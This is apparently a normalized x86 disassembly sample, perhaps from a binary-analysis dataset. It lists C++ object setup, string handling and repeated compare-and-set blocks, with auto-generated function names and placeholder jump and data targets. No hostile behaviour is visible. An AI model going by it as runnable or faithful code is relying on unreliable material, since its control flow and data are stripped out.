push esi
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0xa8 ] 0x3
jmp r-xdata
call sub_423d5c
cmp [ ebp - 0x24 ] eax
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_403dc1
push edi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4d
call sub_403dc1
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x40 ]
push edx
lea edx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4e
mov eax [ ecx ]
push edx
call [ eax + 0x44 ]
push esi
push 0x1
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x11 ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_40415f
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebx + 0xa8 ] 0x4
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x20 ] edi
je r-xdata
mov [ ebx + 0xa8 ] 0x5
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
mov edi [ ebp - 0x18 ]
test edi edi
je r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
mov [ ebp - 0x11 ] 0x0
push r--data
lea ecx [ ebp - 0xe0 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x4f
or [ ebp - 0x1c ] 0x20
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push rw-data
lea edx [ ebp - 0xe0 ]
push edx
call [ eax + 0x44 ]
mov [ ebp - 0x11 ] 0x1
test al al
jne r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
and [ ebp - 0x1c ] 0xffffffdf
push 0x0
push 0x1
lea ecx [ ebp - 0xe0 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x1c ] 0x20
je r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_408d54
xor esi esi
jmp r-xdata
mov [ ebx + 0xa4 ] edi
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x6
jmp r-xdata
mov eax [ ebp - 0x7c ]
mov edi [ eax + 0x14 ]
mov eax [ eax ]
cmp [ ebp - 0x24 ] esi
je r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x7
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x8
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x9
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0xa
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0xb
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0xd
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0xe
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0xf
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x10
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x11
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x12
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x13
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x14
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x15
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x16
jmp r-xdata
call sub_40f2a9
mov eax [ eax ]
mov [ ebx + 0xac ] eax
call sub_40f2a9
lea ecx [ ebx + 0xb0 ]
push ecx
mov ecx [ eax ]
call sub_41e7ed
pop ecx
jmp r-xdata
sub_41e32b
push 0x194
mov eax sub_43ea05
call sub_425dad
xor ebx ebx
push 0x2f4
mov [ ebp - 0x10 ] ebx
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x14 ] ebx
mov edi ebx
push r--data
lea ecx [ ebp - 0x110 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp - 0x164 ]
mov [ ebp - 0x10 ] 0x1
call sub_403dc1
push 0x3
pop edi
mov [ ebp - 0x4 ] 0x2
push r--data
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0x10 ] edi
call sub_403dc1
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x164 ]
push eax
lea eax [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] edi
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x7
call sub_41c8b6
mov edi eax
mov [ ebp - 0x14 ] edi
jmp r-xdata
test [ ebp - 0x10 ] 0x2
je r-xdata
and [ ebp - 0x10 ] 0xfffffffb
push ebx
push 0x1
lea ecx [ ebp - 0xd8 ]
call sub_40415f
test [ ebp - 0x10 ] 0x4
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0x164 ]
call sub_40415f
mov eax [ ebp + 0x10 ]
dec eax
dec eax
mov esi 0x80
je r-xdata
and [ ebp - 0x10 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ ebp - 0x110 ]
call sub_40415f
push esi
call sub_4246c6
pop ecx
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] 0x9
cmp eax ebx
je r-xdata
dec eax
je r-xdata
test [ ebp - 0x10 ] 0x10
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xa
or [ ebp - 0x10 ] 0x8
push r--data
lea ecx [ ebp - 0x12c ]
call sub_403dc1
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0xb
or [ ebp - 0x10 ] 0x10
push eax
push [ ebp + 0x10 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
push esi
call sub_4246c6
pop ecx
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] 0xe
cmp eax ebx
je r-xdata
dec eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x8
je r-xdata
and [ ebp - 0x10 ] 0xffffffef
push ebx
push 0x1
lea ecx [ ebp - 0x12c ]
call sub_40415f
test [ ebp - 0x10 ] 0x40
je r-xdata
push r--data
lea ecx [ ebp - 0xf4 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xf
or [ ebp - 0x10 ] 0x20
push r--data
lea ecx [ ebp - 0xbc ]
call sub_403dc1
lea eax [ ebp - 0xf4 ]
push eax
lea eax [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x10
or [ ebp - 0x10 ] 0x40
push eax
push [ ebp + 0x10 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
push esi
call sub_4246c6
pop ecx
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] 0x13
cmp eax ebx
je r-xdata
dec eax
je r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x4c ] ebx
je r-xdata
and [ ebp - 0x10 ] 0xfffffff7
lea ecx [ ebp - 0x30 ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x20
je r-xdata
and [ ebp - 0x10 ] 0xffffffbf
push ebx
push 0x1
lea ecx [ ebp - 0xbc ]
call sub_40415f
test [ ebp - 0x10 ] 0x100
je r-xdata
push r--data
lea ecx [ ebp - 0x84 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x14
or [ ebp - 0x10 ] esi
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x15
or [ ebp - 0x10 ] 0x100
push eax
push [ ebp + 0x10 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
push esi
call sub_4246c6
pop ecx
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] 0x18
cmp eax ebx
je r-xdata
dec eax
jne r-xdata
mov edi [ ebp + 0xc ]
cmp [ edi + 0x14 ] ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1d
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
add edi 0x8c
push edi
lea edx [ ebp - 0x30 ]
push edx
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
and [ ebp - 0x10 ] 0xffffffdf
lea ecx [ ebp - 0xf4 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x80
je r-xdata
and [ ebp - 0x10 ] 0xfffffeff
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
test [ ebp - 0x10 ] 0x400
je r-xdata
push r--data
lea ecx [ ebp - 0x148 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x19
or [ ebp - 0x10 ] 0x200
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
lea eax [ ebp - 0x148 ]
push eax
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1a
or [ ebp - 0x10 ] 0x400
push eax
push [ ebp + 0x10 ]
xor bl bl
call sub_41ed6b
xor ebx ebx
push r--data
lea ecx [ ebp - 0x180 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x7
call sub_403dc1
lea ecx [ ebp - 0x180 ]
push ecx
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x8
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0xa0 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x180 ]
jmp r-xdata
mov ebx [ ebp - 0x14 ]
call sub_41cc2a
mov eax ebx
call sub_425e4c
retn
push esi
call sub_4246c6
pop ecx
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] 0x1e
mov esi 0x800
cmp eax ebx
je r-xdata
push ebx
push 0x1
call sub_40415f
and [ ebp - 0x10 ] 0xffffff7f
lea ecx [ ebp - 0x84 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x200
je r-xdata
and [ ebp - 0x10 ] 0xfffffbff
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
xor edi edi
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push edi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1f
mov edi [ ebp - 0x14 ]
or [ ebp - 0x10 ] esi
push eax
push [ ebp + 0x10 ]
xor bl bl
call sub_41ed6b
mov edi eax
xor ebx ebx
jmp r-xdata
and [ ebp - 0x10 ] 0xfffffdff
lea ecx [ ebp - 0x148 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x19c ]
call sub_403dc1
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x19c ]
mov [ ebp - 0x4 ] 0x21
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x19c ]
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] esi
je r-xdata
sub_41e7ed
push 0x60
mov eax sub_43ca01
call sub_425e16
mov eax [ ebp + 0x8 ]
mov esi ecx
xor edi edi
push r--data
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] edi
call sub_403dc1
lea ecx [ ebp - 0x50 ]
push ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] edi
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
push edi
push 0x1
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x2
call sub_40415f
cmp [ ebp - 0x18 ] edi
jne r-xdata
lea ebx [ ebp - 0x2c ]
push r--data
lea ecx [ ebp - 0x6c ]
call sub_403dc1
mov ebx eax
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
call sub_425e60
retn
push edi
push 0x1
lea ecx [ ebp - 0x6c ]
call sub_40415f
mov eax [ esi ]
mov ecx esi
call [ eax + 0x2c ]
push ebx
mov ebx [ ebp - 0x34 ]
mov esi eax
call sub_404aa3
push 0xffffffff
push edi
push esi
mov ecx eax
call sub_40400a
test [ ebp - 0x30 ] 0x1
je r-xdata
sub_41e897
push 0x30
mov eax sub_43ba8d
call sub_425dad
mov ebx ecx
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
call sub_40ed30
mov eax [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x18 ]
lea esi [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
call sub_40f543
xor ebx ebx
inc ebx
test al al
jne r-xdata
push 0x0
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x24 ] 0xf
call sub_404490
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x10 ] ebx
call sub_40f2d4
add eax 0x1c
jmp r-xdata
mov eax [ ebp + 0x8 ]
call sub_425e4c
retn
push 0x0
push ebx
lea ecx [ ebp - 0x3c ]
call sub_40415f
mov ecx [ ebp + 0x8 ]
push eax
call sub_403de3
or [ ebp - 0x10 ] 0x2
test [ ebp - 0x10 ] bl
je r-xdata
sub_41e91d
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
push edi
mov edi ecx
cmp edi eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ eax + 0x14 ]
mov ebx [ eax ]
mov eax [ esi ]
mov [ esp + 0x14 ] eax
call sub_418ebb
mov eax [ edi + 0x14 ]
mov eax [ eax ]
mov ecx [ edi ]
push esi
push ebx
push [ esp + 0x1c ]
push ebx
push eax
push ecx
push [ esp + 0x28 ]
push edi
call sub_41e962
sub_41e962
push 0x14
mov eax sub_43ba59
call sub_425de0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
call sub_425e4c
retn 0x20
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40f2a9
mov edi [ ebp + 0x8 ]
mov ecx eax
call sub_418ef0
call sub_408d54
jmp r-xdata
lea edi [ ebp + 0x20 ]
lea esi [ ebp + 0x18 ]
call sub_41ea56
test al al
je r-xdata
sub_41ea05
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x10 ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_408d54
cmp edi [ ebx + 0x14 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebx ]
pop edi
mov [ eax ] ecx
pop esi
leave
retn 0xc
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
mov [ eax ] ecx
mov eax [ edi ]
mov ecx [ edi + 0x4 ]
lea esi [ edi + 0x8 ]
mov [ eax + 0x4 ] ecx
call sub_4049b2
push edi
call sub_42412e
dec [ ebx + 0x18 ]
pop ecx
sub_41ea73
push 0x44
mov eax sub_43e059
call sub_425e16
mov ebx ecx
mov eax [ ebx ]
call [ eax + 0x28 ]
push r--data
lea ecx [ ebp - 0x4c ]
mov esi eax
call sub_403dc1
and [ ebp - 0x4 ] 0x0
mov eax [ ebx ]
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx ebx
call [ eax + 0x40 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_40415f
push r--data
mov eax esi
call sub_40563c
pop ecx
test al al
je r-xdata
push r--data
mov eax esi
call sub_40563c
pop ecx
test al al
je r-xdata
mov ecx rw-data
lea eax [ ebp - 0x2c ]
call sub_40561a
test al al
je r-xdata
push r--data
mov eax esi
call sub_40563c
pop ecx
test al al
je r-xdata
mov ecx rw-data
lea eax [ ebp - 0x2c ]
call sub_40561a
test al al
je r-xdata
mov ecx rw-data
lea eax [ ebp - 0x2c ]
call sub_40561a
test al al
je r-xdata
push 0xec
call sub_4246c6
pop ecx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
xor esi esi
jmp r-xdata
mov ecx rw-data
lea eax [ ebp - 0x2c ]
call sub_40561a
test al al
je r-xdata
push 0x60
call sub_4246c6
pop ecx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
mov ecx rw-data
lea eax [ ebp - 0x2c ]
call sub_40561a
test al al
je r-xdata
push 0x60
call sub_4246c6
pop ecx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x4
xor eax eax
push ebx
push eax
call sub_4215b3
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov eax esi
call sub_425e60
retn
push 0xec
call sub_4246c6
pop ecx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x9
test eax eax
je r-xdata
test eax eax
je r-xdata
mov ecx rw-data
lea eax [ ebp - 0x2c ]
call sub_40561a
test al al
je r-xdata
push 0x28
call sub_4246c6
pop ecx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x5
test eax eax
je r-xdata
push eax
call sub_4180a2
jmp r-xdata
mov esi eax
push ebx
push eax
call sub_410660
jmp r-xdata
mov ecx rw-data
lea eax [ ebp - 0x2c ]
call sub_40561a
test al al
je r-xdata
push 0x28
call sub_4246c6
pop ecx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x6
test eax eax
je r-xdata
push eax
call sub_421265
jmp r-xdata
push 0x28
call sub_4246c6
pop ecx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x7
test eax eax
je r-xdata
push eax
call sub_4143b7
jmp r-xdata
push eax
call sub_414210
jmp r-xdata
sub_41ec78
push 0x3c
mov eax sub_43ba3e
call sub_425dad
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x4 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
push eax
mov [ esi ] r--data
call sub_418e5f
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x14 ] bl
je r-xdata
mov eax [ ebp + 0xc ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x10 ] esp
push [ ebp + 0xc ]
call sub_403de3
lea eax [ ebp - 0x2c ]
push eax
call sub_41f313
add esp 0x20
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp [ ebp + 0x14 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
push eax
lea ecx [ esi + 0x20 ]
call sub_403de3
mov [ ebp - 0x4 ] 0x3
test [ ebp - 0x10 ] 0x1
je r-xdata
mov eax [ ebp + 0x10 ]
sub esp 0x1c
mov ecx esp
mov [ ebp + 0xc ] esp
push [ ebp + 0x10 ]
call sub_403de3
lea eax [ ebp - 0x48 ]
push eax
call sub_41f313
add esp 0x20
mov [ ebp - 0x4 ] 0x4
or [ ebp - 0x10 ] 0x2
jmp r-xdata
lea eax [ esi + 0x58 ]
push eax
call sub_40f0f4
mov al [ ebp + 0x14 ]
cmp [ esi + 0x34 ] ebx
mov [ esi + 0x7c ] al
setne al
mov [ esi + 0x7d ] al
mov [ esi + 0x74 ] ebx
mov [ esi + 0x78 ] ebx
mov eax esi
call sub_425e4c
retn 0x10
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_40415f
push eax
lea ecx [ esi + 0x3c ]
call sub_403de3
mov [ ebp - 0x4 ] 0x6
test [ ebp - 0x10 ] 0x2
je r-xdata
sub_41ed6b
push 0x3c
mov eax sub_43b9d0
call sub_425dad
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call sub_418e5f
and [ ebp - 0x4 ] 0x0
test bl bl
je r-xdata
mov eax [ ebp + 0xc ]
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x10 ] esp
push [ ebp + 0xc ]
call sub_403de3
lea eax [ ebp - 0x2c ]
push eax
call sub_41f313
add esp 0x20
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
test bl bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
push eax
lea ecx [ esi + 0x20 ]
call sub_403de3
mov [ ebp - 0x4 ] 0x3
test [ ebp - 0x10 ] 0x1
je r-xdata
mov eax [ ebp + 0x10 ]
sub esp 0x1c
mov ecx esp
mov [ ebp + 0xc ] esp
push [ ebp + 0x10 ]
call sub_403de3
lea eax [ ebp - 0x48 ]
push eax
call sub_41f313
add esp 0x20
mov [ ebp - 0x4 ] 0x4
or [ ebp - 0x10 ] 0x2
jmp r-xdata
lea eax [ esi + 0x58 ]
push eax
call sub_40f0f4
mov [ ebp - 0x4 ] 0x7
and [ esi + 0x78 ] 0x0
mov [ esi + 0x74 ] edi
mov [ esi + 0x7c ] bl
mov [ esi + 0x7d ] 0x1
test edi edi
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_40415f
push eax
lea ecx [ esi + 0x3c ]
call sub_403de3
mov [ ebp - 0x4 ] 0x6
test [ ebp - 0x10 ] 0x2
je r-xdata
cmp [ esi + 0x34 ] 0x0
setne al
mov [ esi + 0x7d ] al
mov eax esi
call sub_425e4c
retn 0xc
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x18 ]
sub_41ee71
push 0x4
mov eax sub_43b957
call sub_425dad
mov edi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
lea eax [ edi + 0x4 ]
push eax
mov [ edi ] r--data
call sub_418e5f
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ edi + 0x20 ]
call sub_403de3
mov [ ebp - 0x4 ] 0x2
lea esi [ edi + 0x3c ]
call sub_403dae
lea eax [ edi + 0x58 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_40f0f4
mov [ ebp - 0x4 ] 0x5
and [ edi + 0x78 ] 0x0
mov [ edi + 0x74 ] ebx
mov [ edi + 0x7c ] 0x0
mov [ edi + 0x7d ] 0x1
test ebx ebx
je r-xdata
push [ ebp + 0x14 ]
mov ecx edi
push [ ebp + 0x10 ]
call sub_41f493
cmp [ edi + 0x34 ] 0x0
setne al
mov [ edi + 0x7d ] al
mov eax edi
call sub_425e4c
retn 0x10
mov eax [ ebx ]
push edi
mov ecx ebx
call [ eax + 0x18 ]
sub_41eefe
push 0xc
mov eax sub_43b910
call sub_425dad
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x3
lea ebx [ edi + 0x58 ]
mov eax [ ebx + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx ]
mov [ ebp - 0x18 ] eax
call sub_423d5c
cmp [ ebp - 0x18 ] eax
je r-xdata
and [ edi + 0x74 ] 0x0
mov eax ebx
call sub_416fc8
push 0x0
push 0x1
lea ecx [ edi + 0x3c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ edi + 0x20 ]
call sub_40415f
lea eax [ edi + 0x4 ]
call sub_418e9c
call sub_425e4c
retn
lea esi [ ebp - 0x18 ]
call sub_40f2a9
mov ecx [ eax ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
lea esi [ ebp - 0x18 ]
call sub_408d54
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
cmp [ ebp - 0x18 ] 0x0
mov esi [ ebx + 0x14 ]
mov eax [ ebx ]
je r-xdata
sub_41ef95
push 0x44
mov eax sub_43ac1e
call sub_425dad
mov edi ecx
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push r--data
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x2c ] ebx
call sub_403dc1
sub esp 0x1c
mov [ ebp - 0x4 ] ebx
lea eax [ edi + 0x20 ]
xor esi esi
mov ecx esp
mov [ ebp - 0x14 ] esp
inc esi
push eax
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x1c ] eax
call sub_403de3
lea eax [ ebp - 0x48 ]
push eax
call sub_41f281
add esp 0x20
push 0xffffffff
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x10 ]
push ebx
call sub_404233
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
cmp [ edi + 0x1c ] ebx
je r-xdata
mov eax [ edi + 0x50 ]
cmp eax ebx
jne r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax ]
